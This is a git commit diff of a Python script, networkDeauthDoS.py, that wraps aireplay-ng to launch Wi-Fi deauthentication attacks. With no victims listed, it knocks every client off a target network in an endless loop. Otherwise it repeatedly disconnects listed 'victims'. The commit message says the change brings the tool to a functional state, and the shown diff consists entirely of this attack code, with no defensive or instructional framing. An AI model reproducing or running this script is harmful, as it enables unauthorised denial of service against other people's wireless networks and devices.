fef9eb74f43e52cb69dc2c0adad7682866ac0235
Juan Carlos Jimenez <jcjc.dev@gmail.com>
2016-06-25 16:47:26 +0100

    Get v2 to a functional state

--- networkDeauthDoS.py
+++ networkDeauthDoS.py
@@ -18,20 +18,19 @@ victims   = []
 interface = "wlan1mon"
 
 def deauth_all_clients(net):
-    '''There's no point using this script if you're not gonna specify specific
-       clients. You should probably use aireplay-ng directly'''
-    print "\n[+] Deauthenticating all clients in the network\n"
-    command = "aireplay-ng -a {0} {1}".format(net, interface)
+    command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, interface)
+    print "[+] Deauthenticating all clients in the network"
+    print "[!] You may as well run aireplay-ng directly: [{0}]\n".format(command)
     subprocess.call([command], shell=True) #Runs forever
 
 def deauth_client(net, cli):
     print "\n[+] Deauthenticating {0}\n".format(cli)
-    command = "aireplay-ng -a {0} -c {1} -0 3 {2}".format(net, cli, interface)
+    command = "aireplay-ng --deauth 3 -a {0} -c {1} {2}".format(net, cli, interface)
     subprocess.call([command], shell=True)
 
 if __name__ == '__main__':
     #Init Message
-    print "[+] Target Network:\n\t- {0}".format(network)
+    print "[+] Target Network:\n\t{0}".format(network)
 
     if len(victims) == 0:
         deauth_all_clients(network) #Will only return if there's an error
@@ -39,7 +38,7 @@ if __name__ == '__main__':
 
     print "[+] Target Clients:"
     for i in range(0, len(victims)):
-        print "\t- {0}".format(victims[i])
+        print "\t{0}".format(victims[i])
 
     while True:
         for i in range(0, len(victims)):
